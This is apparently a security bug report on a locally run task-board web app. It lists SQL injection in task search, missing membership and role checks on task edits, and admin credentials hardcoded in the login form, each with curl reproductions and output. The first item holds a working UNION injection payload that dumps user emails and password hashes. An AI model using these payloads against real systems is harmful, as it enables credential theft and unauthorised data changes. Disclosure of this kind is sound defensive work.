# Bug Report

Ranked by business impact (highest first).

---

## 1. SQL Injection in Task Search (`?q=` parameter)

- **Severity:** Critical
- **Category:** Security / Data Integrity
- **Files:** `src/app/api/projects/[id]/tasks/route.ts` (lines 25-35)

The `q` search parameter is interpolated directly into a raw SQL string and executed via `prisma.$queryRawUnsafe`, with no parameterization or escaping (`WHERE project_id = '${projectId}' AND (title ILIKE '%${q}%' ...)`). This allows an authenticated user to inject arbitrary SQL through the task search endpoint, including UNION-based queries to read data from unrelated tables such as `users` (emails, password hashes). Verified exploitable via `GET /api/projects/:id/tasks?q=' UNION SELECT ... FROM users--`.

**Reproduction (replace `<MEERA_TOKEN>` with a real JWT from `POST /api/auth/login`):**
```bash
MEERA_TOKEN="<MEERA_TOKEN>"
PROJECT_ID="cmrfxzkf10006q940cvga6qe2"   # Q3 Launch

# UNION-based extraction of emails + password hashes from the users table.
# Note: the payload closes the "(title ILIKE ... OR description ILIKE ...)"
# group with `')` before UNION — UNION cannot appear inside a WHERE boolean
# expression, so a bare quote-break alone throws a 500 syntax error instead
# of executing. Closing the paren first turns it into two valid, unioned SELECTs.
curl -s -G "http://localhost:3000/api/projects/$PROJECT_ID/tasks" \
  -H "Authorization: Bearer $MEERA_TOKEN" \
  --data-urlencode "q=nonexistent') UNION SELECT id, email, password_hash, name, null, null, id, 0, created_at, updated_at FROM users -- "
```

**Actual proof output (HTTP 200 — all 5 users' emails and bcrypt password hashes exfiltrated through a task-search response):**
```json
{"tasks":[
  {"id":"cmrfxzkez0001q9402o6b36pr","project_id":"arjun@taskboard.dev","title":"$2a$10$AkS/em2VyJIAHYNIT0oFPuxPlD5maD8.l2lsUZggh8V4NdG2SGoh2","description":"Arjun Rao", ...},
  {"id":"cmrfxzkf10004q9408qmgfphi","project_id":"lina@example.com","title":"$2a$10$AkS/em2VyJIAHYNIT0oFPuxPlD5maD8.l2lsUZggh8V4NdG2SGoh2","description":"Lina Joshi", ...},
  {"id":"cmrfxzkey0000q940wjusmcl5","project_id":"meera@taskboard.dev","title":"$2a$10$AkS/em2VyJIAHYNIT0oFPuxPlD5maD8.l2lsUZggh8V4NdG2SGoh2","description":"Meera Iyer", ...},
  {"id":"cmrfxzkf00003q940k2iqtyf3","project_id":"dev@example.com","title":"$2a$10$AkS/em2VyJIAHYNIT0oFPuxPlD5maD8.l2lsUZggh8V4NdG2SGoh2","description":"Dev Sharma", ...},
  {"id":"cmrfxzkez0002q940r9mr4aly","project_id":"kavya@example.com","title":"$2a$10$AkS/em2VyJIAHYNIT0oFPuxPlD5maD8.l2lsUZggh8V4NdG2SGoh2","description":"Kavya Reddy", ...}
]}
```
(`project_id` and `title` fields are hijacked to carry `email` and `password_hash` respectively — every seeded user's email and bcrypt hash is exposed in a single unauthenticated-scope search request.)

---

## 2. Any Non-Member Can Edit Any Task

- **Severity:** Critical
- **Category:** Security
- **Files:** `src/app/api/tasks/[id]/route.ts` (PATCH handler, lines 16-38); contrast with `DELETE` handler (lines 40-57) in the same file, which correctly calls `getProjectMembership` and `canEditTasks`.

The `PATCH /api/tasks/:id` handler only verifies that the requester is authenticated (`getCurrentUser`) and never checks whether they belong to the task's project. Any registered user — including one with zero memberships anywhere in the system — can modify the title, description, status, or assignee of any task in any project. Verified: a freshly registered user with no project memberships successfully changed a task's title and status in a project it was denied direct read access to (`GET /api/projects/:id` correctly returned 403, but `PATCH /api/tasks/:id` returned 200).

**Reproduction (`lina@example.com` — member of a different project only, no membership on the target project):**
```bash
# Get a JWT for a user with zero relationship to the target project
LINA_TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"lina@example.com","password":"password123"}' | jq -r '.token')

TASK_ID="cmrfxzkf5000pq9400acohlzs"   # "Draft press release" — belongs to Q3 Launch

# Confirm direct project access is correctly blocked (expect 403)
curl -s -w "\nHTTP_STATUS:%{http_code}\n" \
  http://localhost:3000/api/projects/cmrfxzkf10006q940cvga6qe2 \
  -H "Authorization: Bearer $LINA_TOKEN"

# Attempt to edit a task in that same project anyway (returns 200 — the bug)
curl -s -w "\nHTTP_STATUS:%{http_code}\n" -X PATCH "http://localhost:3000/api/tasks/$TASK_ID" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $LINA_TOKEN" \
  -d '{"title":"edited by a non-member — should have been 403"}'
```

**Actual proof output:**
```
$ curl -s -w "\nHTTP_STATUS:%{http_code}\n" http://localhost:3000/api/projects/cmrfxzkf10006q940cvga6qe2 -H "Authorization: Bearer $LINA_TOKEN"
{"error":"you are not a member of this project"}
HTTP_STATUS:403

$ curl -s -w "\nHTTP_STATUS:%{http_code}\n" -X PATCH "http://localhost:3000/api/tasks/cmrfxzkf5000pq9400acohlzs" \
  -H "Content-Type: application/json" -H "Authorization: Bearer $LINA_TOKEN" \
  -d '{"title":"edited by a non-member — should have been 403"}'
{"task":{"id":"cmrfxzkf5000pq9400acohlzs","projectId":"cmrfxzkf10006q940cvga6qe2","title":"edited by a non-member — should have been 403","description":"Detail for: Draft press release","status":"review","assigneeId":"cmrfxzkez0001q9402o6b36pr","createdById":"cmrfxzkey0000q940wjusmcl5","position":1,"createdAt":"2026-07-11T05:46:52.577Z","updatedAt":"2026-07-11T06:51:22.451Z","assignee":{"id":"cmrfxzkez0001q9402o6b36pr","name":"Arjun Rao","email":"arjun@taskboard.dev"}}}
HTTP_STATUS:200
```
(Direct project read correctly returns 403, but the task PATCH on the very same project succeeds with 200 — the membership check is simply missing on this endpoint.)

---

## 3. Viewer Role Can Edit Tasks (Business Logic / Authorization Bypass)

- **Severity:** Critical
- **Category:** Security / Architecture

- **Files:** `src/app/api/tasks/[id]/route.ts` (PATCH handler); role rule defined in `src/lib/auth.ts` (`canEditTasks`, lines 55-57: `role === "admin" || role === "member"` — deliberately excludes `viewer`).

The `viewer` project role is defined to explicitly exclude edit permissions (enforced correctly in the `DELETE` handler, which returns "viewers cannot delete tasks"), but `PATCH` performs no role check at all. A user with `viewer` membership on a project can therefore edit any task within it, directly violating the app's own permission model. Verified: `dev@example.com` (role: `viewer` on "Q3 Launch") successfully changed a task title via `PATCH /api/tasks/:id`, returning 200 instead of the expected 403.

> When a viewer edits a task via `PATCH /api/tasks/:id`, the app applies the change and returns 200, but should reject the request with 403 (consistent with the viewer restriction already enforced on task deletion).

**Reproduction (`dev@example.com` — `viewer` role on Q3 Launch):**
```bash
DEV_TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"dev@example.com","password":"password123"}' | jq -r '.token')

TASK_ID="cmrfxzkf5000rq940mu0cs2tb"   # "Record demo video" — Q3 Launch, dev is a viewer here

curl -s -w "\nHTTP_STATUS:%{http_code}\n" -X PATCH "http://localhost:3000/api/tasks/$TASK_ID" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $DEV_TOKEN" \
  -d '{"title":"edited by a viewer — should have been 403"}'
```

**Actual proof output:**
```
$ curl -s -w "\nHTTP_STATUS:%{http_code}\n" -X PATCH "http://localhost:3000/api/tasks/cmrfxzkf5000rq940mu0cs2tb" \
  -H "Content-Type: application/json" -H "Authorization: Bearer $DEV_TOKEN" \
  -d '{"title":"edited by a viewer — should have been 403"}'
{"task":{"id":"cmrfxzkf5000rq940mu0cs2tb","projectId":"cmrfxzkf10006q940cvga6qe2","title":"edited by a viewer — should have been 403","description":"Detail for: Record demo video","status":"in_progress","assigneeId":"cmrfxzkez0002q940r9mr4aly","createdById":"cmrfxzkey0000q940wjusmcl5","position":2,"createdAt":"2026-07-11T05:46:52.578Z","updatedAt":"2026-07-11T06:51:21.854Z","assignee":{"id":"cmrfxzkez0002q940r9mr4aly","name":"Kavya Reddy","email":"kavya@example.com"}}}
HTTP_STATUS:200
```
(A `viewer`-role member successfully modifies a task's title — the endpoint should have returned 403.)

---

## 4. Login Form Pre-fills Live Admin Credentials

- **Severity:** Medium-High
- **Category:** Security
- **Files:** `src/app/login/page.tsx` (lines 10-11)

The login form's email and password fields are initialized with hardcoded default state — `useState("meera@taskboard.dev")` and `useState("password123")` — rather than empty strings, and neither input sets an `autoComplete` attribute. This means the credentials of a real seeded admin account (`meera@taskboard.dev`, an `admin` on two projects) are visibly populated in the form the moment the login page loads, requiring no lookup or guessing. Any person with access to the running instance can sign in as this admin account without ever needing to know the password.

> When any user opens the login page, the app pre-fills the email and password fields with a real admin account's live credentials, but should render the form with empty fields and no embedded credentials.

**Reproduction:** open `http://localhost:3000/login` in a browser with no prior session — the email and password fields are already populated. The credentials baked into the form (`src/app/login/page.tsx` lines 10-11) are live and authenticate successfully:
```bash
curl -s -w "\nHTTP_STATUS:%{http_code}\n" -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"meera@taskboard.dev","password":"password123"}'
```

**Actual proof output — the exact values pre-filled in the login form authenticate successfully as an admin:**
```
{"user":{"id":"cmrfxzkey0000q940wjusmcl5","email":"meera@taskboard.dev","name":"Meera Iyer"},"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJjbXJmeHprZXkwMDAwcTk0MHdqdXNtY2w1IiwiZW1haWwiOiJtZWVyYUB0YXNrYm9hcmQuZGV2IiwiaWF0IjoxNzgzNzUyNjg2LCJleHAiOjE3ODYzNDQ2ODZ9.qxdoQM6Wu_WUEy3rATfKgDLZhCs5smmVOZHLFSH9Vgs"}
HTTP_STATUS:200
```
